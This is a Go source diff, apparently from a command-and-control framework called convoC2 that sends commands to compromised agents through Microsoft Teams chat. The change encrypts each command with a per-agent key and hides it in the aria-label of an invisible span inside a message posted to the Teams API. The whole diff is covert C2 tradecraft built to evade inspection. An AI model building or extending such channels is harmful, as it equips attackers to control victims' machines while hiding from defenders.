@@ -9,6 +9,8 @@ import (
 	"regexp"
 	"strings"
 	"time"
+
+	"github.com/cxnturi0n/convoC2/pkg/crypto"
 )
 
 var MsgTimeout int
@@ -19,8 +21,8 @@ const chatEndUrl = "/messages"
 
 const createThreadUrl = "https://teams.microsoft.com/api/chatsvc/emea/v1/threads"
 
-func ExecuteCmdPostRequestWithMessageAndCommand(chatUrl string, authToken string, message string, command string, commandResponsesChan chan CommandResponse) (string, error) {
-	bodyBytes, err := createMessageBody(message, command)
+func ExecuteCmdPostRequestWithMessageAndCommand(chatUrl string, authToken string, message string, command string, agentID string, commandResponsesChan chan CommandResponse) (string, error) {
+	bodyBytes, err := createMessageBody(message, command, agentID)
 	if err != nil {
 		return "", err
 	}
@@ -34,7 +36,13 @@ func ExecuteCmdPostRequestWithMessageAndCommand(chatUrl string, authToken string
 	return getCommandResponse(commandResponsesChan)
 }
 
-func createMessageBody(message string, command string) ([]byte, error) {
+func createMessageBody(message string, command string, agentID string) ([]byte, error) {
+	// Encrypt and obfuscate the command
+	encryptedCommand, err := crypto.Encrypt(command, agentID)
+	if err != nil {
+		return nil, fmt.Errorf("failed to encrypt command: %w", err)
+	}
+
 	type MessageBody struct {
 		Type        string `json:"type"`
 		Content     string `json:"content"`
@@ -43,7 +51,7 @@ func createMessageBody(message string, command string) ([]byte, error) {
 	}
 
 	// Embed the command in aria-label of hidden span tag
-	content := fmt.Sprintf(`<p>%s</p><span aria-label="%s" style="display:none;"></span>`, message, command)
+	content := fmt.Sprintf(`<p>%s</p><span aria-label="%s" style="display:none;"></span>`, message, encryptedCommand)
 
 	requestBody := MessageBody{
 		Type:        "Message",
